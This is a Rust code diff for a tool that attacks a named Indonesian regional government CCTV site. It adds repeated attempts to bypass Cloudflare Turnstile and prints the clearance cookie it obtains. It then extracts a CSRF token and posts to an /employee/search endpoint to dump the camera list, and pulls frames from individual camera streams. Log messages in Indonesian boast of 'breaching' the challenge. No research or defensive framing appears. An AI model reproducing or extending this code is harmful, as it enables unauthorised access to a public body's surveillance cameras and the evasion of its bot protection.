@@ -41,13 +41,62 @@ fn main() -> Result<()> {
 
     let runtime = Builder::new_multi_thread().enable_all().build()?;
     runtime.block_on(async {
-        println!("[1] Memulai bypass Cloudflare Turnstile di cctv.banyuasinkab.go.id...");
+        println!("[1] Memulai bypass Cloudflare Turnstile di cctv.banyuasinkab.go.id (Engine v5.0 Warp Turbo)...");
         let base_url = Url::parse("https://cctv.banyuasinkab.go.id/")?;
         
         let client = browser.client(&options)?;
         
-        let clearance = browser.solve_with_client(&client, &base_url, &options).await?;
-        println!("Challenge Berhasil Ditembus! cf_clearance: {}", clearance.clearance);
+        let mut clearance_opt = None;
+        let max_solve_attempts = 4;
+        for attempt in 1..=max_solve_attempts {
+            println!("Solve attempt {}/{}...", attempt, max_solve_attempts);
+            match browser.solve_with_client(&client, &base_url, &options).await {
+                Ok(c) => {
+                    println!("Challenge Berhasil Ditembus! cf_clearance: {}", c.clearance);
+                    clearance_opt = Some(c);
+                    break;
+                }
+                Err(e) => {
+                    eprintln!("[-] Solve attempt {} error: {}", attempt, e);
+                    tokio::time::sleep(Duration::from_millis(1500)).await;
+                }
+            }
+        }
+
+        let clearance = match clearance_opt {
+            Some(c) => c,
+            None => anyhow::bail!("Gagal bypass Turnstile setelah {} percobaan", max_solve_attempts),
+        };
+
+        // Query /employee/search jika tersedia
+        println!("\n[*] Mengambil data endpoint daftar kamera Banyuasin...");
+        if let Ok(home_resp) = client.http.get("https://cctv.banyuasinkab.go.id/").send().await {
+            if let Ok(home_html) = home_resp.text().await {
+                let csrf_re = regex::Regex::new(r#"meta name="csrf-token" content="([^"]+)""#).ok();
+                if let Some(re) = csrf_re {
+                    if let Some(caps) = re.captures(&home_html) {
+                        let token = caps[1].to_string();
+                        let form_body = format!("_token={}&keyword=", urlencoding::encode(&token));
+                        let search_res = client.http
+                            .post("https://cctv.banyuasinkab.go.id/employee/search")
+                            .header("Referer", "https://cctv.banyuasinkab.go.id/")
+                            .header("X-CSRF-TOKEN", &token)
+                            .header("X-Requested-With", "XMLHttpRequest")
+                            .header("Content-Type", "application/x-www-form-urlencoded")
+                            .body(form_body)
+                            .send()
+                            .await;
+                        if let Ok(s_resp) = search_res {
+                            if let Ok(s_text) = s_resp.text().await {
+                                println!("\n=== DISCOVERED CCTV LIST RAW ===");
+                                println!("{}", s_text);
+                                println!("================================\n");
+                            }
+                        }
+                    }
+                }
+            }
+        }
 
         for cam_id in &cam_ids {
             let stream_url = format!("https://cctv.banyuasinkab.go.id/stream/{}", cam_id);
@@ -99,15 +148,15 @@ fn main() -> Result<()> {
                 anyhow::bail!("Stream ended before frame completion");
             }).await;
 
-            if let Err(e) = parse_res {
-                eprintln!("[-] Cam {} timeout atau error: {}", cam_id, e);
+            match parse_res {
+                Ok(Ok(())) => (),
+                Ok(Err(e)) => eprintln!("[-] Cam {} parsing error: {}", cam_id, e),
+                Err(_) => eprintln!("[-] Cam {} timeout (12s)", cam_id),
             }
         }
 
-        Ok::<(), anyhow::Error>(())
-    })?;
-
-    Ok(())
+        Ok(())
+    })
 }
 
 fn find_subsequence(haystack: &[u8], needle: &[u8]) -> Option<usize> {
